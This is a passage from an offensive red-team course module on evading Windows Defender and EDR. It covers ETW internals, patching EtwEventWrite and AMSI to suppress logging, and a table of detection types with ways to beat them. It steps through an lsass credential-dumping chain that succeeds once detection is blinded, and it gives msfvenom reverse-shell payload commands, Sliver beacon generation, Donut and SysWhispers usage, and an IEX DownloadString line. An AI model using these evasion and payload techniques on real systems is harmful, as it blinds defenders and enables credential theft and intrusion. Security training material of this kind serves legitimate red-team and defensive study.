Security tools read these events to see what is happening.

ETW has been in Windows since Windows 2000.
In 2026, it is one of the primary sources of data
that Defender and EDR products use for detection.


### 7.2 - ETW Has Three Parts

```
PROVIDERS                 SESSIONS                 CONSUMERS
(Things that             (Collection              (Things that
 send events)             and buffering)            read events)

+-----------+            +-----------+            +-----------+
| PowerShell|--events--->|           |--events--->| Defender  |
| Provider  |            |  Trace    |            |           |
+-----------+            |  Session  |            +-----------+
                         |           |
+-----------+            |  (kernel  |            +-----------+
| .NET      |--events--->|   mode    |--events--->| Sysmon    |
| Provider  |            |   buffers)|            |           |
+-----------+            |           |            +-----------+
                         |           |
+-----------+            |           |            +-----------+
| Process   |--events--->|           |--events--->| Your SIEM |
| Provider  |            |           |            |           |
+-----------+            +-----------+            +-----------+
```

Providers: Programs that create events.
           Windows has hundreds of built-in providers.

Sessions:  Collection points that buffer events in kernel memory.
           Events go from provider to session to consumer.

Consumers: Tools that read events and do something with them.
           Defender, Sysmon, SIEMs, Event Viewer.


### 7.3 - ETW Providers That Matter for Red Teaming

These are the providers that will get you caught:

```
PROVIDER NAME                                     WHAT IT LOGS
------------------------------------------------------------------------------------
Microsoft-Windows-PowerShell                       Every PowerShell command
Microsoft-Windows-PowerShell/Operational           Script block logging, module loading
Microsoft-Windows-DotNETRuntime                    .NET assembly loading, JIT compilation
Microsoft-Antimalware-Scan-Interface               AMSI scan results (what was scanned)
Microsoft-Windows-Kernel-Process                   Process creation, termination
Microsoft-Windows-Kernel-File                      File creates, reads, writes, deletes
Microsoft-Windows-Kernel-Network                   Network connections
Microsoft-Windows-Kernel-Registry                  Registry reads, writes
Microsoft-Windows-Security-Auditing                Logon events, privilege use
Microsoft-Windows-WMI-Activity                     WMI queries and commands
Microsoft-Windows-TaskScheduler                    Scheduled task creation
```

Hands-on: List all ETW providers on your system:

```powershell
# See how many ETW providers exist
$providers = logman query providers
Write-Host "Total ETW providers:"
($providers | Measure-Object -Line).Lines

# Find security-related providers
logman query providers | Select-String "Security"
logman query providers | Select-String "PowerShell"
logman query providers | Select-String "Defender"
logman query providers | Select-String "AMSI"
logman query providers | Select-String "DotNet"
```

You will see there are OVER 1000 ETW providers on a normal
Windows 11 system. Each one can send events about what is
happening on the system.


### 7.4 - Hands-On: See ETW Events in Real Time

```powershell
# Let's watch PowerShell ETW events in real time
# Open a SECOND PowerShell window as Administrator

# In the Admin window, start collecting PowerShell events:
# (We use Get-WinEvent to see recent events)

# First, see what PowerShell events exist:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 5 |
    Format-Table TimeCreated, Id, Message -Wrap

# Now go to your OTHER (non-admin) PowerShell window and type:
# Get-Process
# dir C:\
# whoami

# Come back to the admin window and check again:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 10 |
    Format-Table TimeCreated, Id, Message -Wrap

# You will see YOUR commands logged!
# Event ID 4104 = Script Block Logging
# This records the FULL TEXT of what you typed.
```

This is what the blue team sees.
Every PowerShell command you type is recorded.
If you run attack tools in PowerShell without patching ETW,
the blue team will see EXACTLY what you did.


### 7.5 - How EtwEventWrite Works

The function `EtwEventWrite` is the main way events are sent.
It lives in ntdll.dll (the same DLL that handles syscalls).

```
When a provider wants to send an event:

1. The provider calls EtwEventWrite(RegHandle, EventDescriptor, DataCount, Data)
2. EtwEventWrite is in ntdll.dll
3. It transitions to kernel mode
4. The kernel writes the event to the trace session buffer
5. The consumer (Defender, Sysmon) reads the event from the buffer
```

The important thing: EtwEventWrite is a function in ntdll.dll.
Just like NtAllocateVirtualMemory, it can be patched.


### 7.6 - How ETW Patching Works (The Idea)

```
BEFORE patching:

EtwEventWrite:
    4C 8B D1          mov r10, rcx
    B8 xx xx xx xx    mov eax, <syscall number>
    0F 05             syscall
    C3                ret

Events are sent to the kernel and logged.


AFTER patching:

EtwEventWrite:
    C3                ret          <-- We wrote this byte!
    8B D1             (never reached)
    B8 xx xx xx xx    (never reached)
    0F 05             (never reached)
    C3                (never reached)

The function returns IMMEDIATELY.
No events are sent. Nothing is logged.
The kernel never receives the event.
```

This is the same idea as AMSI patching.
Find the function in memory, change the first byte to C3 (ret).
The function does nothing. No events are created.

We will do this hands-on in Module 02.


### 7.7 - Why You Need to Patch ETW

Even if your attack succeeds, ETW records can get you caught
AFTER the attack.

```
Scenario: You inject into a process and steal credentials.

Without ETW patch:
- ETW logs the .NET assembly loading
- ETW logs the process injection APIs
- ETW logs the credential access
- Blue team reviews logs next morning
- They see exactly what you did
- They trace the whole attack chain
- They know your C2 IP address
- They know which user you compromised

With ETW patch:
- You patch EtwEventWrite first
- Then you do the injection and credential theft
- No events are created
- Blue team sees nothing in the logs
- Attack is not discovered (at least not through ETW)
```

---

## PART 8: HOW ATTACKERS GET CAUGHT

---

### 8.1 - Detection Types

Defender uses multiple detection methods at the same time.
You need to beat ALL of them, not just one.

```
TYPE               WHEN IT CHECKS        WHAT IT CHECKS         HOW TO BEAT IT
------------------------------------------------------------------------------------
Signature          File on disk           Known byte patterns    Change the bytes
                                          File hashes (SHA256)   Recompile, encrypt

AMSI               Script at runtime      Known strings and      Patch AMSI in memory
                                          patterns in scripts

Heuristic          File on disk           PE structure, imports   Change code structure
                                          entropy, packing       Use custom builder

Behavior           Program at runtime     API calls, memory      Use different APIs
                                          access patterns        Direct syscalls

Cloud ML           File on disk           Machine learning        Hard to beat
                   (sent to Microsoft)    model classification    Changes each time

ETW Logging        After the fact         Event logs showing     Patch ETW before
                                          what happened          your attack
```


### 8.2 - The Five Mistakes That Get Attackers Caught

Mistake 1: Using known tools as-is

```
You download mimikatz.exe from GitHub and run it.
Defender has the hash of every Mimikatz build ever made.
Detection time: less than 1 second.

Fix: Modify source code, change strings, recompile.
Better: Write your own tool with different API patterns.
```

Mistake 2: Running PowerShell scripts without AMSI bypass

```
You type: Invoke-Mimikatz
AMSI sees the string "Invoke-Mimikatz" and blocks it.
Even Base64 encoding does not help - AMSI sees the decoded version.

Fix: Bypass AMSI first, then run your scripts.
Better: Use C# or Go instead of PowerShell.
```

Mistake 3: Not patching ETW

```
Your attack works. Credentials stolen.
But ETW logged every step: .NET loading, process access, everything.
Blue team reads the logs next day and traces your whole attack.

Fix: Patch EtwEventWrite before doing anything.
Better: Patch BOTH AMSI and ETW at the start.
```

Mistake 4: Creating suspicious process trees

```
Excel.exe starts cmd.exe which starts powershell.exe.
This process tree is a known attack indicator.
Excel should never start cmd.exe.

Fix: Spoof the parent process ID (PPID spoofing).
Make it look like explorer.exe started your process.
```

Mistake 5: Using RWX memory

```
Your shellcode loader creates memory with READ+WRITE+EXECUTE.
Defender watches for this. Normal programs do not need RWX.

Fix: Allocate as RW first, write your shellcode,
     then change to RX using VirtualProtect.
     This is called RW -> RX transition.
```


### 8.3 - Real Example: A Full Attack (Step by Step)

Let's trace a real attack and see where detection happens:

```
ATTEMPT 1: Download and run Mimikatz

Step: Download mimikatz.exe
Detection: WdFilter.sys scans the file -> Signature match -> BLOCKED
Lesson: You cannot use known tools directly.

ATTEMPT 2: Compile Mimikatz from modified source

Step: Change strings in source, compile, transfer to target
Detection: Passes file scan (no signature match)
Step: Run modified mimikatz.exe
Detection: Behavior monitor sees lsass.exe access -> BLOCKED
Lesson: Changing strings beats signatures but not behavior.

ATTEMPT 3: PowerShell script version

Step: Run Invoke-Mimikatz in PowerShell
Detection: AMSI scans the script text -> Pattern match -> BLOCKED
Lesson: AMSI catches known script patterns.

ATTEMPT 4: AMSI bypass + PowerShell Mimikatz

Step: Bypass AMSI first (patch AmsiScanBuffer)
Step: Now run Invoke-Mimikatz
Detection: AMSI is bypassed, script runs...
           But behavior monitor still sees lsass.exe access -> BLOCKED
Lesson: AMSI bypass alone is not enough for protected targets.

ATTEMPT 5: Custom C# tool + direct syscalls + AMSI/ETW patch

Step: Write custom tool in C# that reads lsass differently
Step: Use direct syscalls (bypass EDR hooks on ntdll)
Step: Patch AMSI and ETW before running
Step: Use MiniDumpWriteDump through direct syscall
Detection: No AMSI alert (patched), no ETW logs (patched),
           no hooked API calls (direct syscalls)
Result: SUCCESS - but only because we combined multiple techniques
Lesson: You need a CHAIN of bypasses, not just one.
```

---

## PART 9: THE CAT AND MOUSE GAME

---

### 9.1 - Everything Gets Caught Eventually

This is the most important section of this module.

Every technique in this course has a shelf life.
What works today might be caught tomorrow.

```
Timeline of a bypass technique:

Day 1:    Researcher discovers new bypass
Day 7:    Blog post published, tool released on GitHub
Day 14:   Red teamers start using it
Day 30:   Microsoft sees the technique in telemetry
Day 45:   Microsoft releases a detection rule
Day 60:   The technique no longer works against updated Defender

This cycle repeats forever.
New technique -> Detection rule -> New technique -> Detection rule
```

This is the cat and mouse game.
You MUST understand this or you will always be behind.


### 9.2 - How to Think Like a Researcher (Not Just a User)

Most people who fail red teaming interviews are TOOL USERS.
They download a tool, run it, and hope it works.
When the tool gets detected, they are stuck.

You need to be a TECHNIQUE UNDERSTANDER.
You understand WHY a technique works.
When it gets detected, you know how to change it.

```
TOOL USER:
- Downloads AMSI bypass script from GitHub
- Runs it. It works. 
- Microsoft adds a signature for the script.
- Runs it again. Blocked. Confused.
- Searches for a new script. 

TECHNIQUE UNDERSTANDER:
- Knows that AMSI bypass works by patching AmsiScanBuffer
- Knows the patch writes bytes that make the function return early
- When the specific patch bytes get caught...
- Changes the patch bytes (uses a different instruction sequence)
- Or uses a different method entirely (hardware breakpoints)
- Or targets a different AMSI function (AmsiOpenSession)
- Never dependent on one specific tool or script
```

This is what this course teaches you.
Not just "run this tool."
But "this is HOW it works, and this is how to CHANGE it."


### 9.3 - The Three Rules of Adaptation

Rule 1: UNDERSTAND THE DETECTION FIRST

```
When a technique gets caught, find out WHY.

Is Defender detecting:
- The specific bytes you patched? (signature)
- The API call pattern? (behavior)
- The string in your script? (AMSI/string match)
- The memory permission change? (heuristic)

Once you know WHAT is detected, you know what to change.
```

Rule 2: CHANGE THE SMALLEST THING POSSIBLE

```
Do not rewrite everything.
Change only the part that gets detected.

Example:
Your AMSI bypass patches these bytes: 0xB8 0x57 0x00 0x07 0x80 0xC3
Defender now has a signature for this exact byte sequence.

Fix: Use different bytes that do the same thing.
     Instead of "mov eax, 0x80070057; ret"
     Use "xor eax, eax; ret" (different bytes, same result)

You changed 6 bytes. The technique still works.
```

Rule 3: HAVE MULTIPLE TECHNIQUES FOR EACH TASK

```
Never depend on one bypass method.

For AMSI bypass, know at least 3 methods:
1. AmsiScanBuffer memory patching
2. amsiInitFailed reflection
3. Hardware breakpoints

If method 1 gets detected, try method 2.
If method 2 gets detected, try method 3.
If all 3 get detected, combine them or create a new variation.
```


### 9.4 - How to Test if Your Technique Works

Before using any technique on a real target:

```
1. Update Defender signatures in your lab VM
   Get-MpComputerStatus
   Update-MpSignature

2. Turn ON all Defender protections
   Real-time, cloud, behavior, AMSI - everything ON.

3. Run your technique

4. Check if it was caught:
   - Did Defender show an alert?
   - Check Protection History
   - Check Event Logs for detection events:

   Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" |
       Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } |
       Select-Object -First 5 TimeCreated, Message

5. If caught, find out WHY:
   - What detection name did Defender give?
   - Was it a file detection or behavior detection?
   - At what point was it caught?

6. Change your technique and test again.

7. Repeat until it works with all protections ON.
```


### 9.5 - Staying Updated

The landscape changes fast. Here is how to keep up:

```
Follow these sources for new techniques:

GitHub:
- Search "AMSI bypass" and sort by "Recently updated"
- Search "EDR evasion" and sort by "Recently updated"
- Watch repos: SysWhispers, Donut, Sliver, SharpCollection

Twitter/X:
- Follow offensive security researchers
- Follow #infosec #redteam #evasion hashtags

Blogs:
- blog.xpnsec.com (Adam Chester - deep Windows internals)
- rastamouse.me (Red team operations)
- trustedsec.com/blog (Research and tools)
- elastic.co/security-labs (Detection research - know your enemy)

Conferences:
- DEF CON talks (free on YouTube)
- Black Hat talks (free on YouTube)
- BSides talks (free on YouTube)
```

When you see a new detection rule from Defender:
- Read what it detects
- Understand the pattern
- Modify your technique to avoid that pattern

When you see a new bypass technique:
- Understand HOW it works (not just download and run)
- Add it to your toolkit
- Test it against current Defender

---

## PART 10: LAB SETUP (VMware Pro + Windows 11 from Scratch)

---

### 10.1 - What You Need

```
Your Computer (the attacker):
- CPU: 4+ cores
- RAM: 16+ GB (32 GB is better)
- Disk: 100+ GB free (SSD is better)
- Internet connection

Software to Download:
- VMware Workstation Pro (free for personal use)
- Windows 11 ISO (free from Microsoft)
- Optional: Kali Linux VM (for Linux attack tools)
```


### 10.2 - Install VMware Workstation Pro

```
Step 1: Download VMware

Go to: https://www.vmware.com/products/desktop-hypervisor/workstation-and-fusion
Or search Google: "VMware Workstation Pro download free personal"

Click "Download Now" for Windows.
Save the installer (about 600 MB).


Step 2: Run the Installer

Double-click the downloaded EXE.
Click "Next" through the wizard.
Accept the license agreement.
Choose install location (default is fine).
Check "Add VMware to system PATH" when you see the option.
Click "Install".
Wait 5-10 minutes.
Restart your computer when asked.


Step 3: First Launch

Open VMware Workstation Pro.
If it asks for a license, choose "Use for Personal Use".
It should open without needing a key.
```


### 10.3 - Download Windows 11 ISO

```
Step 1: Go to Microsoft's website

https://www.microsoft.com/software-download/windows11


Step 2: Download the ISO

Scroll down to "Download Windows 11 Disk Image (ISO)".
Select "Windows 11 (multi-edition ISO)".
Click "Download Now".
Choose your language (English recommended).
Click "64-bit Download".
The file is about 5-6 GB. Save it somewhere easy to find.
Example: C:\ISOs\Win11.iso
```


### 10.4 - Create the Windows 11 VM

```
Step 1: New Virtual Machine

In VMware, click "File" -> "New Virtual Machine"
Choose "Custom (advanced)" -> Next


Step 2: Hardware Compatibility

Keep the default (latest version) -> Next


Step 3: Installation Source

Select "I will install the operating system later" -> Next
(We set up hardware first, then install)


Step 4: Guest OS

Operating System: Microsoft Windows
Version: Windows 11 x64
-> Next


Step 5: VM Name

Name: Win11-Target
Location: Choose a folder with enough space
-> Next


Step 6: Firmware

Select UEFI
Check "Secure Boot" (Windows 11 needs this)
-> Next


Step 7: CPU

Number of processors: 1
Number of cores per processor: 4
(Minimum 4 cores for smooth operation)
-> Next


Step 8: Memory

Set to 4096 MB minimum (4 GB)
8192 MB is better (8 GB)
-> Next


Step 9: Network

Select NAT (shares your internet connection)
-> Next


Step 10: I/O Controller

Keep default (LSI Logic SAS) -> Next


Step 11: Disk Type

Keep default (NVMe) -> Next


Step 12: Create Disk

Select "Create a new virtual disk" -> Next
Size: 80 GB minimum
Check "Store virtual disk as a single file"
-> Next


Step 13: Finish

Click "Finish"
```


### 10.5 - Add ISO and TPM

```
Step 1: Attach the ISO

Click "Edit virtual machine settings"
Click "CD/DVD (SATA)"
Select "Use ISO image file"
Browse to your Windows 11 ISO file
Click OK


Step 2: Add TPM (Required for Windows 11)

In VM Settings, click "Add"
Select "Trusted Platform Module"
Click "Finish"
Click OK
```


### 10.6 - Install Windows 11

```
Step 1: Start the VM

Click "Power on this virtual machine"


Step 2: Boot from DVD

When you see "Press any key to boot from CD/DVD" - press a key quickly


Step 3: Windows Setup

Language: English (United States)
Time: Choose your timezone
Keyboard: US
Click "Next" -> "Install now"


Step 4: Product Key

Click "I don't have a product key"


Step 5: Edition

Select "Windows 11 Pro" (Pro has more features we need)
Accept the license -> Next


Step 6: Installation Type

Choose "Custom: Install Windows only"
Select the virtual disk -> Next


Step 7: Wait

Windows will install (10-20 minutes)
The VM restarts several times - this is normal


Step 8: Initial Setup

Choose your country and keyboard layout.

When it asks for Microsoft account, do this trick:
- Type: no@thankyou.com as the email
- Type any password
- It will say "Oops, something went wrong"
- Now it lets you create a local account

Create local account:
- Username: redteam
- Password: something simple (this is a lab)
- Security questions: fill in anything

Privacy settings: Turn everything OFF
Click "Accept" and wait for desktop
```


### 10.7 - Install VMware Tools

```
In VMware menu: VM -> Install VMware Tools

In the Windows VM:
Open File Explorer -> This PC -> DVD Drive
Double-click setup64.exe
Choose "Complete" install
Restart when asked

Now you can:
- Resize the VM window
- Copy/paste between host and VM
- Drag and drop files
```


### 10.8 - Update Windows 11

```
Settings -> Windows Update -> Check for updates

Download and install ALL updates.
Restart when asked.
Check for updates AGAIN after restart.
Repeat until "You're up to date".

This takes 30-60 minutes. Do not skip it.
We need a fully updated system for realistic testing.
```


### 10.9 - Verify Defender is Active

```powershell
# Open PowerShell as Administrator
# Right-click Start -> Terminal (Admin)

# Check Defender status
Get-MpComputerStatus | Select-Object `
    AMServiceEnabled,
    AntispywareEnabled,
    AntivirusEnabled,
    BehaviorMonitorEnabled,
    RealTimeProtectionEnabled,
    IoavProtectionEnabled,
    AntivirusSignatureLastUpdated

# All values should be True
# SignatureLastUpdated should be recent

# Update signatures
Update-MpSignature
```


### 10.10 - Take a Snapshot NOW

```
This is VERY IMPORTANT.

In VMware: VM -> Snapshot -> Take Snapshot
Name: "Clean-Win11-Updated"
Description: "Fresh Windows 11, updated, Defender active"

If you break something, you can restore to this clean state.
Take snapshots before testing risky techniques too.
```


### 10.11 - Set Up Your Attacker Machine

You need a machine to attack FROM.

```
Option A: Kali Linux (comes with most tools pre-installed)

1. Go to: https://www.kali.org/get-kali/#kali-virtual-machines
2. Download the VMware version
3. Extract the .7z file
4. Open the .vmx file in VMware
5. Login: kali / kali
6. Update: sudo apt update && sudo apt full-upgrade -y


Option B: Use Your Windows Host

If you prefer to attack from your main Windows machine:
1. Install Python 3 (from python.org)
2. Install Git (from git-scm.com)
3. Install Visual Studio Community (for C# and C++ compilation)
4. Install Go (from go.dev) - needed for Sliver
```

For this course, you can use either.
Most examples will show both Windows and Linux commands.

---

## PART 11: OPEN SOURCE TOOLS FOR THIS COURSE

---

### 11.1 - Tool Overview

This course uses only free, open source tools.

```
TOOL                WHAT IT DOES                          WHERE USED
-------------------------------------------------------------------
Metasploit          Attack framework, exploits            All modules
msfvenom            Create payloads (shellcode, EXEs)     Module 00, 08
Sliver C2           Modern command and control (Go)       All modules
Mythic C2           Modular C2 with web interface         All modules
PowerShell          Scripting, AMSI bypass, recon          Module 01, 02
SysWhispers3        Generate direct syscall code           Module 06
Donut               Convert EXE/DLL to shellcode           Module 04, 08
Invoke-Obfuscation  Obfuscate PowerShell scripts           Module 05
Process Hacker      View processes, memory, handles        All modules
Sysmon              Enhanced Windows logging                Defense labs
```


### 11.2 - Sliver C2 (Primary C2 Framework)

Sliver is a modern C2 framework by Bishop Fox.
Written in Go. Actively maintained in 2026.

```bash
# Install on Linux:
curl https://sliver.sh/install | sudo bash

# Start server:
sliver-server

# Generate a beacon (checks in periodically):
sliver > generate beacon --mtls 192.168.1.100 --save /tmp/beacon.exe

# Generate a session (always connected):
sliver > generate --mtls 192.168.1.100 --save /tmp/session.exe

# Start listener:
sliver > mtls

# When target connects:
sliver > beacons          (list beacons)
sliver > use <id>         (interact with beacon)
sliver (BEACON) > shell   (get a shell)
sliver (BEACON) > ps      (list processes)

# Sliver supports:
# - mTLS, HTTPS, DNS, WireGuard transport
# - In-memory .NET execution
# - SOCKS5 proxy
# - Port forwarding
# - BOF (Beacon Object Files)
```


### 11.3 - Mythic C2 (Alternative C2)

Mythic is modular and has a web UI. Uses Docker.

```bash
# Install on Linux:
sudo apt install docker.io docker-compose -y
git clone https://github.com/its-a-feature/Mythic.git
cd Mythic
sudo ./install_docker_ubuntu.sh
sudo make
sudo ./mythic-cli start

# Get admin password:
sudo ./mythic-cli config get admin_password

# Open browser: https://your-ip:7443

# Install agents:
sudo ./mythic-cli install github https://github.com/MythicAgents/Apollo.git
sudo ./mythic-cli install github https://github.com/MythicAgents/Athena.git
```

Note: Havoc C2 was archived in February 2026.
Use Sliver or Mythic instead. Both are actively maintained.


### 11.4 - msfvenom (Payload Generator)

Part of Metasploit. Creates payloads in many formats.

```bash
# Raw shellcode (for custom loaders):
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f raw -o shell.bin

# C format shellcode:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f c

# C# format:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f csharp

# Python format:
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f python

# IMPORTANT: Raw msfvenom payloads WILL be caught by Defender.
# We use msfvenom for the raw shellcode, then wrap it in
# our own custom encrypted loader.
```


### 11.5 - Donut (Shellcode Converter)

Converts .NET assemblies and PE files into position-independent shellcode.

```bash
# Install:
git clone https://github.com/TheWover/donut.git
cd donut && make

# Convert a .NET tool to shellcode:
./donut -f Rubeus.exe -o rubeus.bin

# With arguments:
./donut -f Rubeus.exe -o rubeus.bin -p "kerberoast /nowrap"

# The shellcode can be injected into any process.
# No file ever touches disk.
```


### 11.6 - SysWhispers3

Generates direct syscall stubs for C/C++ projects.

```bash
# Install:
git clone https://github.com/klezVirus/SysWhispers3.git
cd SysWhispers3
pip3 install -r requirements.txt

# Generate stubs:
python3 syswhispers.py \
    -f NtAllocateVirtualMemory,NtProtectVirtualMemory,NtWriteVirtualMemory,NtCreateThreadEx \
    -o syscalls

# Output: syscalls.h, syscalls.c, syscalls-asm.x64.asm
# Include these in your C/C++ project to use direct syscalls.
```


### 11.7 - Process Hacker / System Informer

Essential tool for seeing what is happening inside processes.

```
Download: https://systeminformer.sourceforge.io/

What you can see:
- All running processes with their PIDs
- DLLs loaded in each process (find amsi.dll, ntdll.dll)
- Memory regions with permissions (find RWX allocations)
- Threads in each process
- Network connections per process
- Handles (files, registry keys, mutexes)
- Token information (privileges, groups)
```

Install this on your Windows 11 VM. You will use it constantly.

---

## PART 12: YOUR FIRST HANDS-ON LABS

---

### 12.1 - Lab 1: Trigger Defender and Study the Detection

```powershell
# On your Windows 11 VM, open PowerShell

# Create the EICAR test string
# This is a STANDARD test string (not real malware)
# Every antivirus is built to detect this string

$eicar = 'X5O!P%@AP[4\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*'

# Try to save it to a file
$eicar | Out-File -FilePath C:\Users\redteam\Desktop\test.txt

# RESULT: Defender blocks it immediately.
# You will see a notification: "Threat found"

# Now check what Defender saw:
# 1. Click the shield icon in system tray
# 2. Go to: Virus & threat protection -> Protection history
# 3. Read the detection details:
#    - What threat name?
#    - What file path?
#    - What action was taken?

# Also check the event log:
Get-WinEvent -LogName "Microsoft-Windows-Windows Defender/Operational" -MaxEvents 5 |
    Where-Object { $_.Id -eq 1116 -or $_.Id -eq 1117 } |
    Select-Object TimeCreated, Id, Message | Format-List
```

WHAT YOU LEARN: Defender scans files the moment they are written.
WdFilter.sys caught the file. MpEngine matched the EICAR signature.


### 12.2 - Lab 2: See AMSI Block a Script

```powershell
# Try running something AMSI catches:

try {
    IEX "IEX (New-Object Net.WebClient).DownloadString('http://127.0.0.1/test')"
} catch {
    Write-Host "AMSI BLOCKED IT!"
    Write-Host "Error: $($_.Exception.Message)"
}

# RESULT: AMSI blocks it because it matches a known pattern.
# The URL does not even exist - AMSI catches the STRING PATTERN
# before any download happens.

# Now try this - same thing but obfuscated:
$a = "IEX"
$b = "(New-Object"
$c = "Net.WebClient).DownloadString("
$d = "'http://127.0.0.1/test')"
$full = "$a $b $c$d"
Write-Host "Built string: $full"

# The string builds fine.
# But if you try to EXECUTE it with Invoke-Expression,
# AMSI will still likely catch it because AMSI scans
# the FINAL assembled content, not just the source.
```

WHAT YOU LEARN: AMSI scans content at the time of execution.
String splitting alone is not enough. You need a real AMSI bypass.


### 12.3 - Lab 3: See DLLs and Find amsi.dll

```powershell
# List all DLLs in this PowerShell process
$proc = Get-Process -Id $PID
$mods = $proc.Modules

Write-Host "=== DLLs loaded in PowerShell (PID: $PID) ==="
Write-Host ""

# Show key DLLs
$keyDlls = @("ntdll.dll", "kernel32.dll", "kernelbase.dll", "amsi.dll",
             "clrjit.dll", "coreclr.dll", "mscoree.dll")

foreach ($dll in $keyDlls) {
    $mod = $mods | Where-Object { $_.ModuleName -eq $dll }
    if ($mod) {
        $addr = "0x" + $mod.BaseAddress.ToString("X")
        $size = [math]::Round($mod.ModuleMemorySize / 1KB, 1)
        Write-Host "[FOUND] $dll at $addr ($size KB)"
    } else {
        Write-Host "[NOT LOADED] $dll"
    }
}

Write-Host ""
Write-Host "Total modules loaded: $($mods.Count)"
```

WHAT YOU LEARN: amsi.dll is loaded in PowerShell's memory.
You can see its base address. This is where we will patch it.
ntdll.dll is also loaded - this is where ETW and syscalls live.


### 12.4 - Lab 4: Check Defender Settings

```powershell
# Run as Administrator

# Check real-time protection status
$status = Get-MpComputerStatus
Write-Host "=== DEFENDER STATUS ==="
Write-Host "Real-Time Protection: $($status.RealTimeProtectionEnabled)"
Write-Host "Behavior Monitoring:  $($status.BehaviorMonitorEnabled)"
Write-Host "IOAV Protection:      $($status.IoavProtectionEnabled)"
Write-Host "Antivirus Enabled:    $($status.AntivirusEnabled)"
Write-Host ""
Write-Host "Signature Version:    $($status.AntivirusSignatureVersion)"
Write-Host "Last Updated:         $($status.AntivirusSignatureLastUpdated)"
Write-Host "Engine Version:       $($status.AMEngineVersion)"

# Check exclusions (as red teamer, finding exclusions = gold)
$prefs = Get-MpPreference
Write-Host ""
Write-Host "=== EXCLUSIONS ==="
Write-Host "Path Exclusions:      $($prefs.ExclusionPath -join ', ')"
Write-Host "Process Exclusions:   $($prefs.ExclusionProcess -join ', ')"
Write-Host "Extension Exclusions: $($prefs.ExclusionExtension -join ', ')"

# Check ASR rules
$asrIds = $prefs.AttackSurfaceReductionRules_Ids
$asrActions = $prefs.AttackSurfaceReductionRules_Actions
if ($asrIds) {
    Write-Host ""
    Write-Host "=== ASR RULES ==="
    for ($i = 0; $i -lt $asrIds.Count; $i++) {
        $action = switch ($asrActions[$i]) {
            0 { "Disabled" }
            1 { "Block" }
            2 { "Audit" }
            6 { "Warn" }
        }
        Write-Host "Rule: $($asrIds[$i]) -> $action"
    }
} else {
    Write-Host ""
    Write-Host "No ASR rules configured"
}
```

WHAT YOU LEARN: This is what you check on every target.
Exclusions are valuable - if a folder is excluded, you can
put your tools there and Defender will ignore them.


### 12.5 - Lab 5: Watch ETW Events from Your Commands

```powershell
# Open TWO PowerShell windows. One as Admin (for reading logs),
# one as normal user (for running commands).

# === In the ADMIN window: ===
# First, check current PowerShell log count:
$before = (Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 1000).Count
Write-Host "Events before: $before"

# === In the NORMAL window: ===
# Run some commands:
Get-Process
Get-Service
whoami
ipconfig

# === Back in the ADMIN window: ===
# Check new events:
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 20 |
    Where-Object { $_.Id -eq 4104 } |
    Select-Object TimeCreated, @{N='ScriptBlock';E={$_.Properties[2].Value}} |
    Format-List

# You will see your commands logged!
# Event ID 4104 = Script Block Logging
# Every command you typed is recorded in plain text.
```

WHAT YOU LEARN: ETW records your PowerShell commands in full text.
If you do not patch ETW, the blue team sees everything you did.


### 12.6 - Lab 6: Create a Payload and Watch Defender Catch It

On your attacker machine (Linux or Windows with Python):

```bash
# Generate a simple payload
msfvenom -p windows/x64/meterpreter/reverse_tcp \
    LHOST=192.168.1.100 LPORT=4444 -f exe -o test_payload.exe

# Start a simple HTTP server to transfer it:
python3 -m http.server 8080
```

On the Windows 11 VM, try to download it:

```powershell
# Try to download the payload
# Open Edge browser and go to: http://192.168.1.100:8080/test_payload.exe

# Defender will block the download.
# The file will be quarantined before it reaches disk.

# Check Protection History to see the detection.
# Note the detection name - it will say something about
# "Trojan" or "HackTool" or "Meterpreter"
```

WHAT YOU LEARN: Raw msfvenom payloads are caught instantly.
Defender knows the byte patterns of every standard msfvenom output.
This is why we need encryption, custom loaders, and obfuscation.

---

## SUMMARY: WHAT YOU LEARNED AND WHAT IS NEXT

---

### What You Now Know

```
1. WINDOWS INTERNALS:
   - What PE files are and how Windows loads them
   - What a process is: PID, memory space, threads, PEB
   - How memory is organized: stack, heap, code, data
   - Memory permissions: R, W, X and why RWX is suspicious
   - What DLLs are and the key DLLs (ntdll, kernel32, amsi)

2. THE API CHAIN:
   - Your code -> kernel32.dll -> ntdll.dll -> kernel
   - User mode vs Kernel mode
   - What syscalls are and how they work
   - Why EDRs hook ntdll.dll and how to skip the hooks

3. WINDOWS DEFENDER:
   - WdFilter.sys (kernel file system scanner)
   - MsMpEng.exe + MpEngine.dll (scan engine + emulation + ML)
   - Tamper Protection and PPL
   - ASR rules and Smart App Control

4. AMSI:
   - amsi.dll is loaded into PowerShell and .NET processes
   - AmsiScanBuffer is the key function
   - It scans content before execution
   - You can patch it in memory to bypass it

5. ETW:
   - Providers send events through sessions to consumers
   - EtwEventWrite in ntdll.dll is the main logging function
   - Patching it stops events from being created
   - Without ETW, blue team logs are empty

6. HOW ATTACKERS GET CAUGHT:
   - Signatures, AMSI strings, behavior, cloud ML, ETW logs
   - You need multiple bypasses, not just one

7. THE CAT AND MOUSE GAME:
   - Every technique has a shelf life
   - Understand WHY, not just HOW
   - Change the smallest thing to avoid detection
   - Have multiple methods for each task
   - Test against updated Defender before real use
```


### Before You Continue

```
Checklist:
[ ] VMware Workstation Pro installed
[ ] Windows 11 VM created and fully updated
[ ] Defender active and signatures updated
[ ] Clean snapshot taken
[ ] Attacker machine ready (Kali or host Windows)
[ ] Process Hacker installed on Windows 11 VM
[ ] Completed all 6 labs in Part 12
[ ] Understand: process, DLL, API chain, user/kernel mode
[ ] Understand: what AMSI is and where it lives in memory
[ ] Understand: what ETW is and why patching it matters
[ ] Understand: the cat and mouse mindset
```

If all boxes are checked, you are ready for Module 01.


### Course Roadmap

```
